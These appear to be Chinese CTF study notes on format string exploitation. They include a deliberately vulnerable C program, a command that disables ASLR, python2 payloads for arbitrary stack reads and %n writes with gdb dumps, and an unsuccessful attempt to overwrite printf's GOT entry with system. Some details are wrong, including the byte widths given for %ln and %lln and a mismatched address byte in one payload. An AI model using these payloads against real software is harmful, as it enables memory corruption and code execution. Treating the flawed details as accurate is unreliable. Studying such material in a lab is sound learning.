格式化字符串漏洞：
输入可控：
对栈可以进行任意读写。

漏洞利用的基本技术点：
1、读任意参数功能
%<arg#>$<format> ——<arg#>表示格式字符串后参数编号，<format>表示输出格式
%13$x —— 表示读取格式字符串后第13个参数，以16进制形式输出

例如，fmt.c示例：
#include<stdio.h>
void main()
{
    char format[128];
    int arg1 = 1, arg2 = 0x88888888, arg3 = -1;
    char arg4[10] = "ABCD";
    scanf("%s", format);
    printf(format, arg1, arg2, arg3, arg4);
    printf("\n");
}
gcc -m32 -fno-stack-protector -no-pie fmt.c -o fmt
设置关闭地址随机化
echo 0 > /proc/sys/kernel/randomize_va_space
root@kali32:/home/ctf# ./fmt
%4$s  ——读取第4个参数
ABCD
root@kali32:/home/ctf# ./fmt
%4$x  ——以16进制输出，显示字符串的地址
bffff5ca

2、读任意地址功能：
将要读取的地址写在格式化字符串中，然后debug调试，获取该地址出现在格式化字符串后面第几个参数，然后用%13$s格式化串读取。
如：读取0xbffff5ca地址，经调试后发现该地址出现在格式化字符串后面第13个参数，因此：
root@kali32:/home/ctf# python2 -c 'print("\xca\xf5\xff\xbf"+".%13$s")' | ./fmt
▒▒▒▒.ABCD
或者：
python2 -c 'print("\xca\xf5\xff\xbf"+".%13$s")' >/home/ctf/text
root@kali32:/home/ctf# ./fmt <text
▒▒▒▒.ABCD
在gdb调试中从文件输入参数方法：
(gdb) r < text
3、覆盖栈内容
%n是输入格式化控制字符，用在scanf或类似的sscanf、fscanf等函数中，意思是把刚刚接收的数据的“字符个数”赋给对应的变量。
scanf("%s%n",a,&t);//把接收的字符个数赋给t，如果%s与%n之间有空格，则t的值也要相应的增加，这么看来应该是%n前面的所有字符都会计数，赋值到后面的变量中。
我们把地址	 	 0x8048000		写入内存：0x8048000的十进制为134512640
printf("%0134512640d%n\n",	1, &i);
$	./a.out
...
0x8048000
所以，要修改某个参数值，需要知道变量地址，然后构造字符串个数，然后进行赋值。
如上面的例子，想把参数1的值修改为0x20.
第一步，需获取到arg1参数的地址，通过gdb调试，可以获取到arg1的栈地址为0xbffff574
第二步，确定输入的格式化字符串在格式化字符串后第几个参数，比如上面的例子是在第13个参数
第三步，构造字符串填充数值，如\x78\xf5\xff\xbf%08x%08x%012d%13$n，地址占4个字节，两个8字节占位符，再加12个占位符就可以了，4+8+8+12=32=0x20
第四步，生成输入文件，因为地址有不可显示字符，所以采用文件输入的方式
python2 -c 'print("\x74\xf5\xff\xbf"+"%08x%08x%012d%13$n")' >text
第五步，执行 ./fmt < text
为了看执行结果，我们在gdb中设置断点调试

Breakpoint 2, 0x08049227 in main ()
(gdb) x/20x $esp
0xbffff570:     0xbffff5a4      0x00000001      0x88888888      0xffffffff
0xbffff580:     0xbffff59a      0xbffff5a4      0x000000c2      0x080491bc
0xbffff590:     0xb7fe0a29      0xf63d4e2e      0x4241faf8      0x00004443
0xbffff5a0:     0x00000000      0xbffff574      0x78383025      0x78383025
0xbffff5b0:     0x32313025      0x33312564      0xb7006e24      0x00000001
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 3, 0x08049234 in main ()
(gdb) x/x 0xbffff574
0xbffff574:     0x00000020    可以看到arg1地址内容被修改为0x20

下面例子将arg1参数改为2
构造参数：
python2 -c 'print("AA%15$nA"+"\x74\xf5\xff\xbf")' > text
%15%n前面两个参数，所以赋值为2.后面加个A，是为了进行8字节对齐。
(gdb) b main
Breakpoint 1 at 0x80491b1
(gdb) r < text
(gdb) b *0x08049227
Breakpoint 2 at 0x8049227
(gdb) b *0x08049234
Breakpoint 3 at 0x8049234
(gdb) n
(gdb) x/20x $esp
0xbffff570:     0xbffff5a4      0x00000001      0x88888888      0xffffffff
0xbffff580:     0xbffff59a      0xbffff5a4      0x000000c2      0x080491bc
0xbffff590:     0xb7fe0a29      0xf63d4e2e      0x4241faf8      0x00004443
0xbffff5a0:     0x00000000      0x31254141      0x416e2435      0xbffff574
0xbffff5b0:     0xb7fffa00      0x00000001      0xb7fd0410      0x00000001
(gdb) x/s 0xbffff5a4
0xbffff5a4:     "AA%15$nAt\365\377\277"
(gdb) x/x 0xbffff574
0xbffff574:     0x01    原来的值
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 3, 0x08049234 in main ()
(gdb) x/x 0xbffff574
0xbffff574:     0x02    修改后的值
(gdb)

大数字的覆盖，前面的方法教我们直接输入一个地址的十进制就可以进行赋值，可是，这样占用的内存空间太大，往往会覆盖掉其他重要的地址而产生错误。我们可以通过长度修饰符来更改写入的值的大小。
printf("%s %hhn\n", str, &c);       // 写入单字节
printf("%s %hn\n", str, &s);        // 写入双字节
printf("%s %n\n", str, &i);         // 写入4字节
printf("%s %ln\n", str, &l);        // 写入8字节
printf("%s %lln\n", str, &ll);      // 写入16字节


fmt_shell.c的手动测试用例，将printf函数地址替换为system函数地址，
system  0xb7e14870
70  112   70
D8  216  148
99  153  1E1
D6  214  2B7
0x804c010
"\x10\xc0\x04\x08"+"\x11\xc0\x04\x08"+"\x12\xc0\x04\x08"+"\x13\xc0\x04\x08"+"%96c%4$hhn"+"%216c%5$hhn"+"%153c%6$hhn"+"%214c%7$hhn"
通过gdb调试查看，发现printf地址已经替换成功，但是命令执行确不成功，不知道什么原因。
